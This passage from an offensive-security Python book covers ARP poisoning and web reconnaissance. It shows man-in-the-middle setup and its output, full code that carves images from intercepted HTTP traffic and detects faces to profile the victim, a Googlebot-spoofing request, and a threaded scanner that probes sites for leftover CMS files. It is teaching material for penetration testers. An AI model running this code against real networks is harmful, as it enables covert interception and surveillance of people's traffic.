are on your Kali VM, enter the following command into your terminal:
#:> echo 1 > /proc/sys/net/ipv4/ip_forward
54 Chapter 4
If you are an Apple fanboy, then use the following command:
fanboy:tmp justin$ sudo sysctl -w net.inet.ip.forwarding=1
Now that we have IP forwarding in place, let’s fire up our script and
check the ARP cache of our target machine. From your attacking machine,
run the following (as root):
fanboy:tmp justin$ sudo python2.7 arper.py
WARNING: No route found for IPv6 destination :: (no default route?)
[*] Setting up en1
[*] Gateway 172.16.1.254 is at 3c:ea:4f:2b:41:f9
[*] Target 172.16.1.71 is at 00:22:5f:ec:38:3d
[*] Beginning the ARP poison. [CTRL-C to stop]
[*] Starting sniffer for 1000 packets
Awesome! No errors or other weirdness. Now let’s validate the attack on
our target machine:
C:\Users\Clare> arp -a
Interface: 172.16.1.71 --- 0xb
Internet Address Physical Address Type
172.16.1.64 10-40-f3-ab-71-02 dynamic
172.16.1.254 10-40-f3-ab-71-02 dynamic
172.16.1.255 ff-ff-ff-ff-ff-ff static
224.0.0.22 01-00-5e-00-00-16 static
224.0.0.251 01-00-5e-00-00-fb static
224.0.0.252 01-00-5e-00-00-fc static
255.255.255.255 ff-ff-ff-ff-ff-ff static
You can now see that poor Clare (it’s hard being married to a hacker,
hackin’ ain’t easy, etc.) now has her ARP cache poisoned where the gateway
now has the same MAC address as the attacking computer. You can clearly
see in the entry above the gateway that I’m attacking from 172.16.1.64.
When the attack is finished capturing packets, you should see an arper.pcap
file in the same directory as your script. You can of course do things such as
force the target computer to proxy all of its traffic through a local instance
of Burp or do any number of other nasty things. You might want to hang
on to that PCAP for the next section on PCAP processing—you never know
what you might find!
PcaP Processing
Wireshark and other tools like Network Miner are great for interactively
exploring packet capture files, but there will be times where you want to
slice and dice PCAPs using Python and Scapy. Some great use cases are gen-
erating fuzzing test cases based on captured network traffic or even some-
thing as simple as replaying traffic that you have previously captured.
Owning the Network with Scapy 55
We are going to take a slightly different spin on this and attempt to
carve out image files from HTTP traffic. With these image files in hand,
we will use OpenCV,2 a computer vision tool, to attempt to detect images
that contain human faces so that we can narrow down images that might
be interesting. We can use our previous ARP poisoning script to generate
the PCAP files or you could extend the ARP poisoning sniffer to do on-the-
fly facial detection of images while the target is browsing. Let’s get started
by dropping in the code necessary to perform the PCAP analysis. Open
pic_carver.py and enter the following code:
import re
import zlib
import cv2
from scapy.all import *
pictures_directory = "/home/justin/pic_carver/pictures"
faces_directory = "/home/justin/pic_carver/faces"
pcap_file = "bhp.pcap"
def http_assembler(pcap_file):
carved_images = 0
faces_detected = 0
u a = rdpcap(pcap_file)
v sessions = a.sessions()
for session in sessions:
http_payload = ""
for packet in sessions[session]:
try:
if packet[TCP].dport == 80 or packet[TCP].sport == 80:
w # reassemble the stream
http_payload += str(packet[TCP].payload)
except:
pass
x headers = get_http_headers(http_payload)
if headers is None:
continue
2. Check out OpenCV here: http://www.opencv.org/.
56 Chapter 4
y image,image_type = extract_image(headers,http_payload)
if image is not None and image_type is not None:
# store the image
 file_name = "%s-pic_carver_%d.%s" % ¬
(pcap_file,carved_images,image_type)
fd = open("%s/%s" % ¬
(pictures_directory,file_name),"wb")
fd.write(image)
fd.close()
carved_images += 1
# now attempt face detection
try:
 result = face_detect("%s/%s" % ¬
(pictures_directory,file_name),file_name)
if result is True:
faces_detected += 1
except:
pass
return carved_images, faces_detected
carved_images, faces_detected = http_assembler(pcap_file)
print "Extracted: %d images" % carved_images
print "Detected: %d faces" % faces_detected
This is the main skeleton logic of our entire script, and we will add
in the supporting functions shortly. To start, we open the PCAP file for
processing u. We take advantage of a beautiful feature of Scapy to auto-
matically separate each TCP session v into a dictionary. We use that and
filter out only HTTP traffic, and then concatenate the payload of all of the
HTTP traffic w into a single buffer. This is effectively the same as right-
clicking in Wireshark and selecting Follow TCP Stream. After we have the
HTTP data reassembled, we pass it off to our HTTP header parsing func-
tion x, which will allow us to inspect the HTTP headers individually. After
we validate that we are receiving an image back in an HTTP response, we
extract the raw image y and return the image type and the binary body of
the image itself. This is not a bulletproof image extraction routine, but as
you’ll see, it works amazingly well. We store the extracted image  and then
pass the file path along to our facial detection routine .
Owning the Network with Scapy 57
Now let’s create the supporting functions by adding the following code
above our http_assembler function.
def get_http_headers(http_payload):
try:
# split the headers off if it is HTTP traffic
headers_raw = http_payload[:http_payload.index("\r\n\r\n")+2]
# break out the headers
headers = dict(re.findall(r"(?P.*?): (?P.*?)\r\n", ¬
headers_raw))
except:
return None
if "Content-Type" not in headers:
return None
return headers
def extract_image(headers,http_payload):
image = None
image_type = None
try:
if "image" in headers['Content-Type']:
# grab the image type and image body
image_type = headers['Content-Type'].split("/")[1]
image = http_payload[http_payload.index("\r\n\r\n")+4:]
# if we detect compression decompress the image
try:
if "Content-Encoding" in headers.keys():
if headers['Content-Encoding'] == "gzip":
image = zlib.decompress(image, 16+zlib.MAX_WBITS)
elif headers['Content-Encoding'] == "deflate":
image = zlib.decompress(image)
except:
pass
except:
return None,None
return image,image_type
These supporting functions help us to take a closer look at the HTTP
data that we retrieved from our PCAP file. The get_http_headers function
58 Chapter 4
takes the raw HTTP traffic and splits out the headers using a regular
expression. The extract_image function takes the HTTP headers and deter-
mines whether we received an image in the HTTP response. If we detect
that the Content-Type header does indeed contain the image MIME type,
we split out the type of image; and if there is compression applied to the
image in transit, we attempt to decompress it before returning the image
type and the raw image buffer. Now let’s drop in our facial detection code
to determine if there is a human face in any of the images that we retrieved.
Add the following code to pic_carver.py:
def face_detect(path,file_name):
u img = cv2.imread(path)
v cascade = cv2.CascadeClassifier("haarcascade_frontalface_alt.xml")
rects = cascade.detectMultiScale(img, 1.3, 4, cv2.cv.CV_HAAR_¬
SCALE_IMAGE, (20,20))
if len(rects) == 0:
return False
rects[:, 2:] += rects[:, :2]
# highlight the faces in the image
w for x1,y1,x2,y2 in rects:
cv2.rectangle(img,(x1,y1),(x2,y2),(127,255,0),2)
x cv2.imwrite("%s/%s-%s" % (faces_directory,pcap_file,file_name),img)
return True
This code was generously shared by Chris Fidao at http://www.fideloper
.com/facial-detection/ with slight modifications by yours truly. Using the
OpenCV Python bindings, we can read in the image u and then apply a
classifier v that is trained in advance for detecting faces in a front-facing
orientation. There are classifiers for profile (sideways) face detection, hands,
fruit, and a whole host of other objects that you can try out for yourself.
After the detection has been run, it will return rectangle coordinates that
correspond to where the face was detected in the image. We then draw an
actual green rectangle over that area w and write out the resulting image x.
Now let’s take this all for a spin inside your Kali VM.
Kicking the Tires
If you haven’t first installed the OpenCV libraries, run the following
commands (again, thank you, Chris Fidao) from a terminal in your
Kali VM:
#:> apt-get install python-opencv python-numpy python-scipy
Owning the Network with Scapy 59
This should install all of the necessary files needed to handle facial
detection on our resulting images. We also need to grab the facial detection
training file like so:
wget http://eclecti.cc/files/2008/03/haarcascade_frontalface_alt.xml
Now create a couple of directories for our output, drop in a PCAP, and
run the script. This should look something like this:
#:> mkdir pictures
#:> mkdir faces
#:> python pic_carver.py
Extracted: 189 images
Detected: 32 faces
#:>
You might see a number of error messages being produced by OpenCV
due to the fact that some of the images we fed into it may be corrupt or
partially downloaded or their format might not be supported. (I’ll leave
building a robust image extraction and validation routine as a homework
assignment for you.) If you crack open your faces directory, you should see
a number of files with faces and magic green boxes drawn around them.
This technique can be used to determine what types of content your
target is looking at, as well as to discover likely approaches via social engi-
neering. You can of course extend this example beyond using it against
carved images from PCAPs and use it in conjunction with web crawling
and parsing techniques described in later chapters.
60 Chapter 4
5
weB Hackery
Analyzing web applications is absolutely critical for
an attacker or penetration tester. In most modern
networks, web applications present the largest attack
surface and so are also the most common avenue for
gaining access. There are a number of excellent web
application tools that have been written in Python,
including w3af, sqlmap, and others. Quite frankly, topics such as SQL
injection have been beaten to death, and the tooling available is mature
enough that we don’t need to reinvent the wheel. Instead, we’ll explore
the basics of interacting with the Web using Python, and then build on
this knowledge to create reconnaissance and brute-force tooling. You’ll
see how HTML parsing can be useful in creating brute forcers, recon tool-
ing, and mining text-heavy sites. The idea is to create a few different tools
to give you the fundamental skills you need to build any type of web appli-
cation assessment tool that your particular attack scenario calls for.
the socket library of the web: urllib2
Much like writing network tooling with the socket library, when you’re cre-
ating tools to interact with web services, you’ll use the urllib2 library. Let’s
take a look at making a very simple GET request to the No Starch Press
website:
import urllib2
u body = urllib2.urlopen("http://www.nostarch.com")
v print body.read()
This is the simplest example of how to make a GET request to a web-
site. Be mindful that we are just fetching the raw page from the No Starch
website, and that no JavaScript or other client-side languages will execute.
We simply pass in a URL to the urlopen function u and it returns a file-like
object that allows us to read back v the body of what the remote web server
returns. In most cases, however, you are going to want more finely grained
control over how you make these requests, including being able to define
specific headers, handle cookies, and create POST requests. urllib2 exposes
a Request class that gives you this level of control. Below is an example of
how to create the same GET request using the Request class and defining a
custom User-Agent HTTP header:
import urllib2
url = "http://www.nostarch.com"
u headers = {}
headers['User-Agent'] = "Googlebot"
v request = urllib2.Request(url,headers=headers)
w response = urllib2.urlopen(request)
print response.read()
response.close()
The construction of a Request object is slightly different than our previ-
ous example. To create custom headers, you define a headers dictionary u,
which allows you to then set the header key and value that you want to
use. In this case, we’re going to make our Python script appear to be the
Googlebot. We then create our Request object and pass in the url and the
headers dictionary v, and then pass the Request object to the urlopen func-
tion call w. This returns a normal file-like object that we can use to read
in the data from the remote website.
We now have the fundamental means to talk to web services and web-
sites, so let’s create some useful tooling for any web application attack or
penetration test.
62 Chapter 5
Mapping open source web app installations
Content management systems and blogging platforms such as Joomla,
WordPress, and Drupal make starting a new blog or website simple, and
they’re relatively common in a shared hosting environment or even an
enterprise network. All systems have their own challenges in terms of
installation, configuration, and patch management, and these CMS suites
are no exception. When an overworked sysadmin or a hapless web devel-
oper doesn’t follow all security and installation procedures, it can be easy
pickings for an attacker to gain access to the web server.
Because we can download any open source web application and locally
determine its file and directory structure, we can create a purpose-built
scanner that can hunt for all files that are reachable on the remote target.
This can root out leftover installation files, directories that should be pro-
tected by .htaccess files, and other goodies that can assist an attacker in get-
ting a toehold on the web server. This project also introduces you to using
Python Queue objects, which allow us to build a large, thread-safe stack of
items and have multiple threads pick items for processing. This will allow
our scanner to run very rapidly. Let’s open web_app_mapper.py and enter the
following code:
import Queue
import threading
import os
import urllib2
threads = 10
u target = "http://www.blackhatpython.com"
directory = "/Users/justin/Downloads/joomla-3.1.1"
filters = [".jpg",".gif","png",".css"]
os.chdir(directory)
v web_paths = Queue.Queue()
w for r,d,f in os.walk("."):
for files in f:
remote_path = "%s/%s" % (r,files)
if remote_path.startswith("."):
remote_path = remote_path[1:]
if os.path.splitext(files)[1] not in filters:
web_paths.put(remote_path)
def test_remote():
x while not web_paths.empty():
path = web_paths.get()
url = "%s%s" % (target, path)
request = urllib2.Request(url)
Web Hackery 63
try:
response = urllib2.urlopen(request)
content = response.read()
y print "[%d] => %s" % (response.code,path)
response.close()
 except urllib2.HTTPError as error:
#print "Failed %s" % error.code
pass